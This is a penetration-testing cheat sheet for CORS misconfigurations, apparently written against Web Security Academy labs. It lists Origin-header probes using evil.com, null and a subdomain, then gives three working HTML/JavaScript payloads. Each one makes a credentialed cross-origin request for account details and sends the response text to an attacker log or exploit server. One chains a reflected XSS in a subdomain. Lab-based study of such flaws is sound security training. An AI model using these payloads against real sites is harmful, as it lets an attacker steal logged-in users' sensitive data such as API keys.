
## Identifying the Vulnerability


- [ ] Find all request that return sensitive information. 
- [ ] Add the following header to the request and look for the following headers in the response:
```http
Origin: https://evil.com
```
```http
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: https://evil.com 
Access-Control-Allow-Credentials: true
```

- [ ] Add the following header to the request and look for the following headers in the response:
```http
Origin: null
```
```http
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: null 
Access-Control-Allow-Credentials: true
```

- [ ] Add the following header to the request and look for the following headers in the response:
```http
Host: vulnerable-website.com 
Origin: https://subdomain.vulnerable-website.com
```
```http
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com 
Access-Control-Allow-Credentials: true
```
## Exploitation

- [ ] Add the following payload depending on the origin header value reflected.

### **https://evil.com

```html
<html>
    <body>
        <script>
            // 1. Initialize a new asynchronous HTTP request
            var xhr = new XMLHttpRequest();
            
            // 2. The target URL where the sensitive data (like API keys or profile info) lives
            var url = "https://0a4300b503a189488001f88600b0009b.web-security-academy.net"

            // 3. Define what happens when the request state changes
            xhr.onreadystatechange = function() {
                // Check if the request is fully complete (DONE)
                if (xhr.readyState == XMLHttpRequest.DONE){
                    /* 4. EXFILTRATION:
                       Once the data is received, send it to the attacker's server.
                       It appends the sensitive response text as a query parameter 
                       to the /log endpoint on the exploit server.
                    */
                    fetch("/log?key=" + xhr.responseText)
                }
            }

            // 5. Configure the request: GET method to the sensitive /accountDetails endpoint
            xhr.open('GET', url + "/accountDetails", true); 
            
            /* 6. THE KEY TO THE EXPLOIT:
               Setting withCredentials to 'true' tells the browser to include the victim's 
               session cookies in this cross-origin request. If the target server has a 
               weak CORS policy (Access-Control-Allow-Credentials: true), it will 
               process the request as the logged-in user.
            */
            xhr.withCredentials = true;
            
            // 7. Fire the request
            xhr.send(null)
        </script>
    </body>
</html>
```
### **null**

```html
<html>
	<body>
		<iframe style="display: none;" sandbox="allow-scripts" srcdoc="
		<script>
			var xhr = new XMLHttpRequest();
			var url = 'https://target.com'
			
			xhr.onreadystatechange = function() {
				if (xhr.readyState == XMLHttpRequest.DONE) {
					fetch('/log?key=' + xhr.responseText)
				}
			}
			
			xhr.open('GET', url + '/sesitiveShit', true);
			xhr.withCredentials = true;
			xhr.send(null)
		</script>"></iframe>
	</body>
</html>
```
## **subdomain**

```html
<script> document.location="http://stock.LAB-ID.web-security-academy.net/?productId=<script>var xhr = new XMLHttpRequest();var url = 'https://LAB-ID.web-security-academy.net';xhr.onreadystatechange = function(){if (xhr.readyState == XMLHttpRequest.DONE) {fetch('https://exploit-ID.exploit-server.net?key=' %2b xhr.responseText)};};xhr.open('GET', url %2b '/accountDetails', true); xhr.withCredentials = true;xhr.send(null);%3c/script>&storeId=1" </script>
```
